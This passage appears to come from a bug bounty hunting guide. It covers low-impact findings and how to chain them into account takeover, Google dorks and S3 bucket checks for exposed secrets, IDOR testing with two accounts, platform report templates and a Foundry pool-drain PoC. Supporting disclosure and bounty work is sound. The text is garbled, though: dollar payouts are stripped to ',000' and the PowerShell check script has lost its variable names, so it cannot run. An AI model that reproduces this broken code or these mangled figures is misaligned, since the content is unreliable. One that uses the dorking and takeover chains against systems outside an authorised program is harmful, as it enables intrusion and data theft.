the 6-digit code in 3 minutes (1M requests at ~500 req/s). Account takeover: ,000.

### 9. Banner / Version Disclosure Without Working Exploit

**Why rejected alone:** Knowing the version is not a vulnerability. The program knows
what software they run.

**Chain condition:** Version disclosure + public CVE with a working PoC = exploitable.
But do not just report the CVE -- test if the PoC actually works against the target.

**Real example:** Researcher found Nginx 1.20.0 running, which has a known integer
overflow issue. They tested the PoC and achieved DoS. Alone: N/A. With PoC: ,500.

### 10. Missing SPF/DMARC Records

**Why rejected alone:** Missing email authentication does not directly compromise
the application. It enables email spoofing, but that is a phishing primitive.

**Chain condition:** Missing SPF DKIM DMARC + email-based password reset = account
takeover via email spoofing. Missing SPF + employee email = BEC phishing.

**Real example:** Researcher found no SPF record on the password reset email domain.
They sent a spoofed password reset email, intercepted the link, and took over the
account. Chain: ,500.

### 11. Clickjacking (Without Demonstrated Impact)

**Why rejected alone:** "I can frame the page in an iframe" -- standard clickjacking
report with no demonstrated action.

**Chain condition:** Clickjacking + CSRF-protected sensitive action = one-click
account takeover. Clickjacking of admin panel = one-click admin action.

**Real example:** Researcher found the account deletion page was framable. They
created a transparent overlay page that tricked users into clicking "delete account"
when they thought they were clicking something else. ,000.

### 12. Information Disclosure That Is Also Public

**Why rejected alone:** If the data is in the source code, public bucket, or Wayback
Machine, it is not a bug.

**Real example:** Researcher found an API key in JavaScript. But the JavaScript was
a publicly cached version on a CDN, and the key was already expired. N/A.

### 13. CRLF Injection That Cannot Splice Headers

**Why rejected alone:** CRLF injection that only reflects in the response body without
splitting headers is not exploitable.

**Chain condition:** CRLF + response splitting = cache poisoning or XSS via response
body interception.

### 14. Host Header Injection on Non-VHost Endpoints

**Why rejected alone:** If the application does not use the Host header for routing
or link generation, changing it has no effect.

**Chain condition:** Host header injection + password reset link generation = attacker
controls the reset link domain.

### 15. Internal IP Disclosure Without Access

**Why rejected alone:** An internal IP address (10.x.x.x, 172.x.x.x, 192.168.x.x)
without the ability to reach that network is not exploitable.

**Chain condition:** IP disclosure + SSRF = you know where to point the SSRF.

### 16. HTTP Method Discovery (TRACE, PUT, DELETE)

**Why rejected alone:** Discovering that OPTIONS returns HTTP methods is not a
vulnerability. Having PUT enabled without authentication could be, but just the
list of methods is not.

### 17. Username Enumeration (Without Impact Demonstration)

**Why rejected alone:** The difference between "user exists" and "user does not exist"
responses is accepted by most programs as a design choice, not a bug.

**Chain condition:** Username enumeration + password spray (no rate limit) = account
takeover. Username enumeration + credential stuffing = account takeover.

### 18. Email Confirmation Bypass (Without Demonstrated Impact)

**Why rejected alone:** Some programs allow unconfirmed emails intentionally.

### 19. Password Complexity Not Enforced

**Why rejected alone:** Security policies are not vulnerabilities.

### 20. Password in Response Body

**Why rejected alone:** Sometimes passwords are sent back in the response for the
user's confirmation. If it is the user's own password, it is not a breach.

**Chain condition:** Password in response + shared computer scenario = session hijacking.

### 21. Account Lockout via Failed Attempts

**Why rejected alone:** This is an intended security feature. Account lockout is
meant to prevent brute-force. The fact that it locks accounts is the feature.

**Chain condition:** Account lockout + no unlock mechanism = DoS. Account lockout
expiration too short + no rate limit = brute-force.

### 22. Token in URL

**Why rejected alone:** If the token is in the URL but the URL is only sent over
HTTPS, this is a design choice.

**Chain condition:** Token in URL + Referer header leaking = token compromise.

### 23. Default Credentials

**Why rejected alone:** Default credentials must be exploitable. If the service
is not exposed to the internet, it is not a bug.

### 24. Non-Descriptive Error Messages

**Why rejected alone:** "User not found" vs "Invalid password" -- this is usernumeration.

### 25. Weak CAPTCHA Implementation

**Why rejected alone:** CAPTCHA is defense-in-depth. Weak CAPTCHA alone does not
cause a security breach.

### 26. Autocomplete Not Disabled on Password Fields

**Why rejected alone:** This is a usability issue, not a security vulnerability.

### 27. Verbose Stack Traces in Development Mode

**Why rejected alone:** If it is a dev environment that is not exposed externally,
it is N/A.

### 28. Cookie Without Expiration

**Why rejected alone:** Session cookies are intentionally session-only.

### 29. Lack of Account Deletion

**Why rejected alone:** GDPR is not your job to enforce via bug bounty.

### 30. Race Condition Without Demonstrated Beneficial Outcome

**Why rejected alone:** "The server processed two requests" -- what did you gain?

### 31. Weak Password Policy

**Why rejected alone:** This is a policy complaint, not a vulnerability.

### 32. Social Media / Email OSINT

**Why rejected alone:** Finding employee names on LinkedIn is not a bug.


---

## 6. VERIFY DATA ISN'T ALREADY PUBLIC

Before submitting any information disclosure finding, you MUST verify that the
data is not publicly accessible. This is the #1 reason info disclosure reports
get N/A'd.

### Public Data Verification Protocol

**Step 1: Incognito Test (Mandatory)**
1. Open a completely clean incognito/private browser window
2. Do NOT log into any account
3. Navigate directly to the URL that contains the "sensitive" data
4. Can you see the same data without being authenticated?
5. If yes -> not a bug. Document what you found and move on.

**Step 2: Wayback Machine Check**
Check the Internet Archive for cached versions of the page or endpoint:
- https://web.archive.org/web/*/https://target.com/endpoint
- Check if the data was public in the past (it may have been removed but still cached)
- If archived copies show the same data -> it was always public

**Step 3: Google Dorking**
Check if the data is indexed by search engines:
  site:target.com "confidential" filetype:pdf
  site:target.com inurl:internal
  site:target.com "private key"

**Step 4: Google Cache Check**
- cache:https://target.com/endpoint
- If Google has cached the data, it is publicly indexed

**Step 5: Public Git Repositories Check**
- Search GitHub for the target's domain + sensitive data
- org:target "API_KEY" (if they have a GitHub org)
- "target.com" "password" in public repos
- Check GitLab, Bitbucket, and source code paste sites

**Step 6: CDN / Public Bucket Check**
- Check if the data is behind a CDN that caches publicly
- Check S3 buckets, GCS buckets, Azure blobs for public access
- https://target.s3.amazonaws.com/ -- does it list files?
- Try https://target.s3.amazonaws.com/path/to/data.json

**Step 7: Third-Party Aggregator Check**
- HaveIBeenPwned for email breaches
- DeHashed for credential searches
- IntelX for dark web leaks
- If the data is in a breach dump, it is public knowledge

**Step 8: API Documentation Check**
- Check if the target has public API docs
- Does the API docs show that this data is intentionally accessible?
- Check Swagger/OpenAPI specs at /api/docs, /swagger.json, /api/swagger, /openapi.yaml

### What to Do If Data Is Public

1. **Document finding anyway** -- sometimes public data is still a valid finding
   if it was never meant to be public (check program scope)
2. **Report as informational** -- some programs accept informational for awareness,
   but expect 
3. **Use as a chain primitive** -- the fact that data is publicly accessible might
   be useful as supporting evidence for another finding
4. **Check adjacent data** -- if /user/1234/profile is public, what about
   /user/1234/private-documents, /user/1234/invoices, /user/1234/payment-methods?

### Automated Public Data Check Script

PowerShell script to check if data is publicly accessible:
   = "https://target.com/api/v2/users/4242/profile"
   = Invoke-WebRequest -Uri  -UseBasicParsing
  Write-Host "Status without auth: "
   = @{"Cookie" = "session=VALID_SESSION"}
   = Invoke-WebRequest -Uri  -Headers  -UseBasicParsing
  Write-Host "Status with auth: "
  if (.Content -eq .Content) {
      Write-Host "WARNING: Data is identical with and without auth!"
  }


---

## 7. TWO TEST ACCOUNTS FOR IDOR

Never test IDOR with only one account (testing yourself as both attacker and victim).
You need to demonstrate cross-user access with separate accounts.

### Account Setup Requirements

- **Account A (attacker):** The account whose session/token is used in the request
- **Account B (victim):** The account whose data is accessed

The report must show: "I sent request with Account A's token but Account B's ID,
and received Account B's private data."

### Account Creation Strategies When Registration Is Blocked

**Strategy 1: Look for Open Registration**
- Check if registration is open on a different subdomain (app1.target.com vs app2.target.com)
- Check if registration is open in different regions
- Check if registration requires only email verification (create unlimited accounts)
- Check if there is a "invite yourself" flow on the signup page
- Check if API registration bypasses the UI restrictions

**Strategy 2: OAuth / Social Login**
- If the target supports Google/GitHub/Facebook login, you can create unlimited test accounts
- Create multiple Google accounts (requires different phone numbers)
- Use developer social accounts (GitHub allows multiple accounts with different emails)
- Apple ID Private Relay can create multiple accounts with different relay emails

**Strategy 3: Test Account via Bug Bounty Program**
- Some programs provide test accounts -- check the program brief
- Some programs have self-service test account creation
- Ask in the program forum (without revealing the finding)
- Check if there is a test/QA/staging environment with pre-created accounts

**Strategy 4: Email Aliases**
- Gmail: youraccount+1@gmail.com, youraccount+2@gmail.com -- all go to your inbox
- Fastmail: Subdomain addressing
- Custom domain: Catch-all email address for unlimited aliases
- Temp mail services (use with caution -- sessions may expire)

**Strategy 5: Invite System Abuse**
- If the app has an invite system, create Account B from Account A's invitation
- If there is a referral program, use it to create linked test accounts
- Teams/organizations feature may allow creating member accounts

**Strategy 6: Partner / Vendor Access**
- Some apps have partner portals with separate registration
- Vendor access may provide elevated test accounts
- API partner programs may have test keys

### Cross-Account Testing Methodology

1. CREATE Account A (attacker@test.com) - get session token SA
2. CREATE Account B (victim@test.com) - get session token SB
3. Using Account B, create some private data (profile, invoice, message, etc.)
4. Using Account A's session token SA:
   GET /api/v2/users/B_ID/profile
5. If response contains Account B's data -> IDOR confirmed
6. If response says "access denied" or only shows Account A's data -> auth works

Always test at least 3 different IDs:
- Account B's numerical ID
- Account B's UUID
- Account B's email (if endpoint accepts email)

### Proving the IDOR in the Report

**Required evidence in screenshot:**
1. Request headers showing Account A's Cookie/Authorization
2. Request URL showing Account B's ID
3. Response body showing Account B's name/data
4. URL bar showing the target domain (not localhost)
5. Developer Tools Network tab showing the full request/response

**Example report statement:**
"In the screenshot below, the request (top panel) uses my session cookie for
attacker@test.com but requests /api/v2/users/4242 (the user ID for victim@test.com).
The response (bottom panel) returns victim@test.com's private data including their name,
email, billing address, and payment history."

### Common IDOR Testing Mistakes

- Using the same account for both attacker and victim -- you need cross-user access
- Testing only one parameter when multiple exist (test user_id, email, uuid, slug, etc.)
- Not testing write operations (PUT, PATCH, DELETE) -- IDOR write is often higher severity
- Testing only the first found ID without testing enumeration
- Not checking if the ID is authenticated but not authorized
- Assuming UUIDs are unguessable -- check if they are sequential or time-based


---

## 8. REPORT FORMAT BY PLATFORM

Each platform has different conventions, different triager expectations, and different
payout structures. Your report format must match the platform.

### HackerOne Format

HackerOne is impact-first. The triager makes a split-second decision based on the
summary line and CVSS. The rest of the report supports that initial impression.

**Structure:**
Title: [Bug Class] in [Feature] allows [Attacker Role] to [Impact]

Summary:
[One sentence: what an attacker can achieve, no technical details]
An attacker can read any user's private payment history by changing the user ID
in the API endpoint.

Description:
[Technical details: endpoint, method, parameters, exact steps]
- Endpoint: GET /api/v2/users/{user_id}/payments
- Authentication: Required (any user account)
- Vulnerability: No authorization check on user_id parameter

Steps to Reproduce:
1. Register Account A (attacker)
2. Register Account B (victim, using different email)
3. As Account A, send request:
   GET /api/v2/users/4242/payments HTTP/1.1
   Cookie: session=ATTACKER_A_SESSION
4. Observe response contains Account B's payment records

Impact:
- 2M+ users affected
- Payment card last-4 digits exposed
- Full purchase history exposed
- GDPR violation for user data access without authorization

Supporting Evidence:
[Screenshot of Burp showing request/response]
[HAR file attached]
[Python PoC script for enumeration]

Suggested Fix:
Validate that user_id matches the authenticated user's ID. Use server-side
session-to-user mapping rather than client-supplied IDs.

Severity: High (CVSS 4.0: 7.1 / AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)

**Full example report (IDOR):**

Title: IDOR in /api/v2/users/{id}/orders allows any authenticated user to view
any customer's order history including shipping address and payment method

Summary:
An attacker with any valid account can view any customer's complete order history
including full name, shipping address, and payment card last-4 digits by changing
the user ID in the order history API endpoint.

Description:
The endpoint GET /api/v2/users/{user_id}/orders returns complete order information
for the specified user without verifying that the requesting user owns that user_id.
The authentication middleware only confirms a valid session exists but does not
perform authorization.

Steps to Reproduce:
1. Create two accounts: attacker@test.com (Account A) and victim@test.com (Account B)
2. Log in as Account A and capture the session cookie
3. Send the following request using Burp Repeater:
   GET /api/v2/users/8472/orders HTTP/1.1
   Host: www.target.com
   Cookie: connect.sid=s%3AA_ACCOUNT_SESSION
   Accept: application/json
4. Response (200 OK) contains Account B (user_id 8472)'s orders

Impact:
- Full name, shipping address, and card last-4 digits for 50,000+ users
- GDPR/CCPA violation (personal data exposed without authorization)
- Automated enumeration possible (sequential integer IDs)

Supporting Evidence:
[Screenshot: Burp showing request with Account A's session + response with Account B's data]
[Screenshot: Incognito view showing Account A's dashboard does not have UI access to Account B's data]
[Python script attached: enumerate_orders.py]

Suggested Fix:
In the route handler, verify that req.user.id matches req.params.user_id.
If they do not match, return 403 Forbidden.

Severity:
CVSS 4.0: 7.1 (High)
AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N

### Bugcrowd Format

Bugcrowd uses VRT (Vulnerability Rating Taxonomy) categories. Your title must
include the VRT category, and the severity justification section is critical.

**Structure:**
Title: [VRT Category]: [Target] - [Brief description]

VRT Category: Server-Side Injection > IDOR > Insecure Direct Object Reference

Description:
A clear explanation of the vulnerability.

Expected Result:
The endpoint should verify that the requesting user is authorized to access the
requested resource.

Actual Result:
The endpoint returns data for any user_id without authorization.

Steps to Reproduce:
1.
2.
3.

Severity / CVSS:
CVSS 4.0: 7.1 High
AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N

Severity Justification:
- PR:L because a free account is required
- VC:H because full PII is disclosed
- No authentication bypass -- just missing authorization
- Affects all users (not a small subset)

Remediation:
Server-side authorization check.

### Intigriti Format

Intigriti puts CVSS front and center. The CVSS score must be the first thing
the triager sees. Business impact translation is critical.

**Structure:**
Title: [CVSS Score] - [Bug Class] in [Feature] - [Brief Impact]

CVSS Score: 7.1 (High)
Vector: AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N

Vulnerability Type: Insecure Direct Object Reference

Endpoint: GET /api/v2/users/{user_id}/orders

Description:
[Same detailed description as above]

Steps to Reproduce:
[Numbered steps with exact requests]

Business Impact:
- GDPR violation: unauthorized access to personal data
- Financial fraud risk: attacker can see transaction history
- Reputation damage: users trust the platform with their data
- Estimated users affected: 50,000+

Suggested Fix:
[1-2 sentences]

References:
[Link to CVSS calculator]
[Link to OWASP IDOR guide]

### Immunefi Format

Immunefi is for smart contract bugs. The format is code-centric and requires
understanding of the blockchain vulnerability class.

**Structure:**
Title: [Bug Class] in [Contract Name]:[Function Name] allows [Impact]

Severity: Critical (CVSS 4.0: 10.0)

Source:
- Contract: LendingPool.sol
- Line: 147-172
- Function: flashLoan()

Root Cause:
The flashLoan function does not verify that msg.sender has approved the
flash loan amount via transferFrom. The function assumes approval exists
if _amount > 0.

Proof of Concept (Foundry):
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.20;
  import "forge-std/Test.sol";
  import "../src/LendingPool.sol";

  contract ExploitLendingPool is Test {
      LendingPool public pool;

      function setUp() public {
          pool = new LendingPool();
          vm.deal(address(pool), 100 ether);
      }

      function testDrainPool() public {
          pool.flashLoan(address(this), 100 ether);
          assertEq(address(pool).balance, 0);
          assertEq(address(this).balance, 100 ether);
      }

      receive() external payable {}
  }

Impact:
- Full pool drain: 100 ETH (,000 at current prices)
- No collateral required
- Single transaction exploit
- All users' deposited funds lost

Suggested Fix:
Add require(allowance[msg.sender][address(this)] >= _amount, "not approved")
before the transferFrom call on line 152.
